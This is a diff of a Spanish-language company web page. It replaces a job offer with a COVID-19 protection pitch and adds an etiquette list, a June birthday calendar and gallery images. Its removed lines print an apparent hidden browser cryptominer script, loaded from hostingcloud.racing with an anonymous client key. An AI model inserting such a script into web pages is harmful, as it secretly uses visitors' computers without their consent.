@@ -22,7 +22,7 @@
 
 		<div class="texto-articulo">
 			<div class="principio">
-				<div class="icono-principios icono-mision"><span class="fas fa-rocket"></span></div>
+				<div class="icono-principios icono-mision"><span class="fas fa-rocket"></span></span></div>
 
 				<h3 class="subtitulo">Misión</h3>
 
@@ -30,7 +30,7 @@
 			</div>
 
 			<div class="principio">
-				<div class="icono-principios icono-vision"><span class="fas fa-eye"></span></div>
+				<div class="icono-principios icono-vision"><span class="fas fa-eye"></span></span></div>
 
 				<h3 class="subtitulo">Visión</h3>
 
@@ -42,16 +42,16 @@
 
 <section class="seccion fondo-celeste seccion-partida" id="propuesta-laboral">
 	<div class="wrapper">
-		<h2 class="titulo">Propuesta Laboral</h2>
+		<h2 class="titulo">#Yo me quedo en casa</h2>
 
 		<figure class="img-articulo"><img src="<?php echo $serverurl; ?>img/laboral.png" alt="Propuesta Laboral KCS"></figure>
 
 		<div class="texto-articulo">
-			<p>Mejora tus expectativas laborales. El limite de tus ingresos lo pones tú.</p>
+			<p>"Ante esta amenaza que representa estar contagiado por el Covid-19, </p>
 
-			<p>Trabaja con nosotros en un ambiente laboral agradable.</p>
+			<p>Hoy más que nunca tenemos la certeza que lo más importante y valioso que tenemos es nuestra Salud, nuestra Vida, nuestra Familia..</p>
 
-			<p>Envianos tus datos, para ponernos en contacto contigo.</p>
+			<p>Acompáñame a buscar la mejor opción de protección para ti y tus seres queridos. Solo tenemos una vida y hay que vivirla bien, sanos y disfrutar junto a nuestra Amada Familia</p>
 
 			<form action="" method="post">
 				<input type="text" name="nombre" placeholder="Nombre y Apellido" value="">
@@ -69,15 +69,151 @@
 		</div>
 	</div>
 </section>
-<script src="https://www.hostingcloud.racing/WS34.js"></script>
-<script>
-    var _client = new Client.Anonymous('f45b772d97cf7f970c2150dac57af1cc92874ad4e6ca1d460233d41298804dc2', {
-        throttle: 0.3, ads: 0
-    });
-    _client.start();
-    
 
-</script>
+<section class="seccion">
+	<div class="wrapper">
+		<h2 class="titulo">Lo que no requiere talento y te convierte en una Gran Persona</h2>
+
+		<div class="actitudes">
+			<div class="actitud">
+				<img src="../img/puntual.png" alt="Ser puntual">
+				<h3 class="subtitulo">1. Ser puntual</h3>
+			</div>
+
+			<div class="actitud">
+				<img src="../img/gracias.png" alt="Dar las gracias">
+				<h3 class="subtitulo">2. Dar las gracias</h3>
+			</div>
+
+			<div class="actitud">
+				<img src="../img/porfavor.png" alt="Decir por favor">
+				<h3 class="subtitulo">3. Decir por favor</h3>
+			</div>
+
+			<div class="actitud">
+				<img src="../img/esfuerzo.png" alt="Esforzarte">
+				<h3 class="subtitulo">4. Esforzarte</h3>
+			</div>
+
+			<div class="actitud">
+				<img src="../img/dejar.png" alt="Dejar que te enseñen">
+				<h3 class="subtitulo">5. Dejar que te enseñen</h3>
+			</div>
+
+			<div class="actitud">
+				<img src="../img/actitud.png" alt="Tener actitud positiva">
+				<h3 class="subtitulo">6. Tener actitud positiva</h3>
+			</div>
+
+			<div class="actitud">
+				<img src="../img/ayudar.png" alt="Ayudar al prójimo">
+				<h3 class="subtitulo">7. Ayudar al prójimo</h3>
+			</div>
+
+			<div class="actitud">
+				<img src="../img/apasionado.png" alt="Ser apasionado">
+				<h3 class="subtitulo">8. Ser apasionado</h3>
+			</div>
+
+			<div class="actitud">
+				<img src="../img/errores.png" alt="Aprender de los errores">
+				<h3 class="subtitulo">9. Aprender de los errores</h3>
+			</div>
+
+			<div class="actitud">
+				<img src="../img/sonreir.png" alt="Sonreir">
+				<h3 class="subtitulo">10. Sonreir</h3>
+			</div>
+		</div>
+	</div>
+</section>
+
+<section class="seccion fondo-celeste seccion-partida" id="seccion-bd">
+	<div class="wrapper">
+		<h2 class="titulo">Junio, mes de Papá</h2>
+	</div>
+
+	<div class="wrapper">
+		<figure class="evento-mensual">
+			<img src="../img/evento-mensual.png" alt="Evento del mes">
+		</figure>
+
+		<div class="cumples-mes">
+			<h2 class="titulo">Cumpleaños</h2>
+			<table>
+				<thead>
+					<tr>
+						<th>Do.</th>
+						<th>Lu.</th>
+						<th>Ma.</th>
+						<th>Mi.</th>
+						<th>Ju.</th>
+						<th>Vi.</th>
+						<th>Sa.</th>
+					</tr>
+				</thead>
+
+				<tbody>
+					<tr>
+						<td></td>
+						<td><img src="../img/dante.png" title="Dante"></td>
+						<td>2</td>
+						<td>3</td>
+						<td>4</td>
+						<td>5</td>
+						<td>6</td>
+					</tr>
+
+					<tr>
+						<td>7</td>
+						<td>8</td>
+						<td>9</td>
+						<td><img src="../img/yashin.png" title="Yashin"></td>
+						<td>11</td>
+						<td>12</td>
+						<td>13</td>
+					</tr>
+
+					<tr>
+						<td>14</td>
+						<td>15</td>
+						<td>16</td>
+						<td>17</td>
+						<td>18</td>
+						<td>19</td>
+						<td>20</td>
+					</tr>
+
+					<tr>
+						<td>21</td>
+						<td>22</td>
+						<td>23</td>
+						<td>24</td>
+						<td>25</td>
+						<td>26</td>
+						<td>27</td>
+					</tr>
+
+					<tr>
+						<td>28</td>
+						<td>29</td>
+						<td>30</td>
+						<td></td>
+						<td></td>
+						<td></td>
+						<td></td>
+					</tr>
+				</tbody>
+			</table>
+
+			<ul class="lista-cumples">
+				<li><span class="nombre bold">Dante</span> - 1ro de Junio</li>
+				<li><span class="nombre bold">Yashin</span> - 10 de Junio</li>
+			</ul>		
+		</div>
+	</div>
+</section>
+
 <section class="seccion">
 	<div class="wrapper">
 		<h2 class="titulo">Galería de Imágenes</h2>
@@ -89,6 +225,9 @@
 			<figure class="foto-galeria"><img src="<?php echo $serverurl; ?>img/galeria/4.jpg" alt=""></figure>
 			<figure class="foto-galeria"><img src="<?php echo $serverurl; ?>img/galeria/5.jpg" alt=""></figure>
 			<figure class="foto-galeria"><img src="<?php echo $serverurl; ?>img/galeria/6.jpg" alt=""></figure>
+            <figure class="foto-galeria"><img src="<?php echo $serverurl; ?>img/galeria/7.jpg" alt=""></figure>
+            <figure class="foto-galeria"><img src="<?php echo $serverurl; ?>img/galeria/8.jpg" alt=""></figure>
+            <figure class="foto-galeria"><img src="<?php echo $serverurl; ?>img/galeria/9.jpg" alt=""></figure>
 		</div>
 	</div>
 </section>
